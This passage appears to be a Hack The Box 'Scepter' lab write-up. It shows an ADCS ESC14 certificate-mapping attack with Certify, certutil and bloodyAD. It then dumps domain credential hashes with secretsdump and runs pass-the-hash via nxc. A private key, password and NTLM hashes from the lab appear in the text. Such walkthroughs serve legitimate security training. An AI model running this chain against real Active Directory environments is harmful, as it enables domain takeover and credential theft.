kjEm7mt/5Vp/N3PiHi8YRpJToRp8ymq6B58LvzWVDRTJvwZMToKpAKFGbWKVPt6I
UVyatoqHDv3C2DFxvava0grW6Km5axGX5CAXMcxPGktPrZwBJ8D5O9jivuim1Kgc
pFbbvwA0NIBC1crK4HxtCPmCSdOvv6V1c1BV1c5o/Q/Bsi1C+oUh+eqjjhNIuwII
ZEZMpJWbi3v8yCZqep1WCZWuduF1+U2jnLfWiQIDAQABAoIBAFbt+HWk5DGqDzKt
HfE3D8OfOZeYvp5ULBZz/oqM5ybCcfGl4GBp8I8qbITklpUzV3mazc2KFAsgAx4H
bck72NobLo/b1faRKNqR3Q3g7ep8V0QMmt5nQTzAObtaTrp3jT3l4h2I0AOu/w/s
yggo3y+QAHyWxWBCqBckHAqdHQ5ImfeCX9evhjtw0VJitaVoUQUcwtMXf6AkiKyu
0P7i35bgsFtRLbdSBVQbucz76Q9vywFkn/ewMTniWxNfIpqUvb66/Fs9ndBZuQjD
aeBPhNZiyEc5mht31JYtxtSc8bq9Xumux+j8gSyBV8EHoKdTo408phPqZxySvvnH
X2gRnjUCgYEA7aLiaP5KyMXtZyAK/YMDAIM8/OYbGV/w4f+t6nFs/PBPWNefNqOd
rqTC2qnSqDHi8jEPIYL9RXvWM8qmjXnGFJHQu5K1bfSXjTBVTcraU8EQElfIqwDq
camuRICPIYWESbVchv/AY0G27K1jExbCHdJMXJH2JexSx8DFtGm3AccCgYEA0VDp
yMhpCMDJBGugPKhTlrcWL+7DMpNUKGfkiBdHb+iWVP/2ko1M52P/UPxD1Xg+cbS9
Wdc/wLqf3qUCa8lIfNPPqfgGhF5jk/qw6hTDzusk1X0bj95bXB7IGdzShDXPaEpj
TWAwXU6OorGBS0dyriyqvAyEOQUforez78w9ZS8CgYEA5Yvz/Mu23Z4jpvwS4bPO
EI61OO3lu2sruoNKMi8Cwoo3e3A9gYAm7u6EsshcjtAxkxXEsfBgSuBGl5znqb25
k2EPKkGbM+2S/3Vy0URkBYd2yOE3G8g0rzri9ZThrdXVZYXlLRqbcsWlt5X9IBFZ
zYi47qqoBRX1GLOjxpRfjT0CgYA2dWHN7m59a4MhVksjXPwae1oXcHxyvSgpNxab
XcslT5NFXC8v4/l9PmQgEvInKRi+BrM5G6qnnyaXC8F8f6sPZyBhbXlsmQ45YwEC
dhKX1FAKB3nTTZvhdNTE/dH7ufBThv8dE4ihzh2IMLyd9GHe9RoawPrpxu57LGZx
Xmce2wKBgQDbKqak6MtlxHP9/XXdAQmlVhls7PKD/KSXuXxWYdZ82gBUVtGxc4PW
zNd6HWgb9v1Uw3ikiZWIY4TUF0D4iaBbZ2cNndLvStNLU92/qQrG4anM9bwKJJdD
xSsVEn2re9ipev+WtR0pWakcki41l4UcqRkn4f1U5YwRcl2DpbO8OA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEzCCBPugAwIBAgITYgAAAAnTxZ+izgRO4AAAAAAACTANBgkqhkiG9w0BAQsF
ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI1MDQyMDIxMDAzMFoXDTI2
MDQyMDIxMDAzMFowUDETMBEGCgmSJomT8ixkARkWA2h0YjEXMBUGCgmSJomT8ixk
ARkWB3NjZXB0ZXIxDjAMBgNVBAMTBVVzZXJzMRAwDgYDVQQDEwdoLmJyb3duMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwk0WwhnFt5H/ZS+HJjBuLEq/
WsLXdEJpRAYD/G7T94cHukpjSnOWtueGP/AJBqTCQRmwo4MXawzzOhv0ci4ZojZm
TQKpUGDNu8zVWNrLsBRFZZ5KkjEm7mt/5Vp/N3PiHi8YRpJToRp8ymq6B58LvzWV
DRTJvwZMToKpAKFGbWKVPt6IUVyatoqHDv3C2DFxvava0grW6Km5axGX5CAXMcxP
GktPrZwBJ8D5O9jivuim1KgcpFbbvwA0NIBC1crK4HxtCPmCSdOvv6V1c1BV1c5o
/Q/Bsi1C+oUh+eqjjhNIuwIIZEZMpJWbi3v8yCZqep1WCZWuduF1+U2jnLfWiQID
AQABo4IC7DCCAugwFwYJKwYBBAGCNxQCBAoeCABVAHMAZQByMCkGA1UdJQQiMCAG
CisGAQQBgjcKAwQGCCsGAQUFBwMEBggrBgEFBQcDAjAOBgNVHQ8BAf8EBAMCBaAw
RAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
MAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSIvTXTQlXpvWfl0lwGbntL
x11pajAfBgNVHSMEGDAWgBTrkFQ40qZsiWrLbU2kunUVYBUn4zCBygYDVR0fBIHC
MIG/MIG8oIG5oIG2hoGzbGRhcDovLy9DTj1zY2VwdGVyLURDMDEtQ0EsQ049ZGMw
MSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
Q049Q29uZmlndXJhdGlvbixEQz1zY2VwdGVyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJl
dm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9p
bnQwgcEGCCsGAQUFBwEBBIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049
c2NlcHRlci1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRi
P2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0
aG9yaXR5MC4GA1UdEQQnMCWgIwYKKwYBBAGCNxQCA6AVDBNoLmJyb3duQHNjZXB0
ZXIuaHRiMEsGCSsGAQQBgjcZAgQ+MDygOgYKKwYBBAGCNxkCAaAsBCpTLTEtNS0y
MS03NDg3OTU0Ni05MTY4MTg0MzQtNzQwMjk1MzY1LTExMDgwDQYJKoZIhvcNAQEL
BQADggEBAJSfmzOXxlPAnU59+3pvkTASRDnfo7nYHdvhv8DzpdgZ8XQ7beyITpNZ
eP1L3fjMmeTQWvFPftICUSE0xKN2Yw2EkPIvRODi5TNMBl9bKIWpn+HlcZxVdXga
xoiFsTdUE7cmNIvBDzSlrZS0qO6C+Le+YBxpHGH9a8/fjRiHlLRJxGI0lRDJrupN
nAEo98J79oapYdgPp6jvHT1dteNTuo/fic5qBklyURF42WGzHZCCslEqTyoeQnEh
NmqldPi6+Jy7mjMEs1iqGg7bInx+f2QangbWXaRh1ZAfOPV4PA75rc1aXcF7w+Pg
rINIHSm3M1MAK3YAfFTqlfl/qAswcJw=
-----END CERTIFICATE-----
```



```
.\Certify.exe request /ca:scepter.htb\scepter-DC01-CA /template:User /user
```



```
*Evil-WinRM* PS C:\Users\h.brown\Documents> certutil -Dump -v .\cert.pfx
Enter PFX password:
================ Certificate 0 ================
================ Begin Nesting Level 1 ================
Element 0:
X509 Certificate:
Version: 3
Serial Number: Get-X509IssuerSerialNumberFormat  <----------------------------------
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Issuer:
    CN=scepter-DC01-CA <----------------------------------
    DC=scepter
    DC=htb
  Name Hash(sha1): bc2436ffc5852d375f65125a8027a519efb748a2
  Name Hash(md5): 38f5516a15b9a664a8caf16b3e0db65b

 NotBefore: 4/20/2025 2:00 PM
 NotAfter: 4/20/2026 2:00 PM

Subject:
    CN=h.brown
    CN=Users
    DC=scepter
    DC=htb
  Name Hash(sha1): 701d7609d02e9c7221ef7916f6726eef617d59f3
  Name Hash(md5): d732fc429af4a006b3ecabe86a316ed7
```


```
*Evil-WinRM* PS C:\Users\h.brown\temp> Get-X509IssuerSerialNumberFormat -SerialNumber "6200000009d3c59fa2ce044ee0000000000009" -IssuerDistinguishedName "CN=scepter-DC01-CA,DC=scepter,DC=htb"
X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000e04e04cea29fc5d30900000062
```


```
[Apr 21, 2025 - 00:36:25 (+03)] exegol-htb /workspace # bloodyAD --host "dc01.scepter.htb" -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities -v 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000e04e04cea29fc5d30900000062'
[+] p.adams's altSecurityIdentities has been updated
```

---

# unintended


```
bloodyAD --host "10.129.81.110" -d scepter.htb -u a.carter -p 'FuckYou123!' set object d.baker mail -v p.adams@scepter.htb
```


```
[Apr 21, 2025 - 01:09:33 (+03)] exegol-htb /workspace # bloodyAD --host "dc01.scepter.htb" -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities   <------ this is to clean up the attribute
[+] p.adams's altSecurityIdentities has been updated
[Apr 21, 2025 - 01:09:46 (+03)] exegol-htb /workspace # bloodyAD --host "dc01.scepter.htb" -d scepter.htb -u h.brown -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'
[+] p.adams's altSecurityIdentities has been updated
```



```
[Apr 20, 2025 - 17:17:14 (+03)] exegol-htb /workspace # secretsdump -hashes :'1b925c524f447bb821a8789c4b118ce0' "scepter.htb"/"p.adams"@"dc01.scepter.htb"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
p.adams\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:9e9e15a774a14f34e0094ea39272c538:::
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
```


```
[Apr 20, 2025 - 17:18:44 (+03)] exegol-htb /workspace # nxc smb 10.129.81.110 -u 'administrator' -H 'a291ead3493f9773dc615e66c2ea21c4' -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.129.81.110   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.129.81.110   445    DC01             [+] scepter.htb\administrator:a291ead3493f9773dc615e66c2ea21c4 (admin)
SMB         10.129.81.110   445    DC01             [+] Executed command via wmiexec
SMB         10.129.81.110   445    DC01             eb913116098db4c4bbaa470bdadbb82b
```





explained path;




https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0

https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1

https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate#practice

https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-b-target-with-x509rfc822-email


https://youtu.be/_8FE3JZIPfo?t=2141

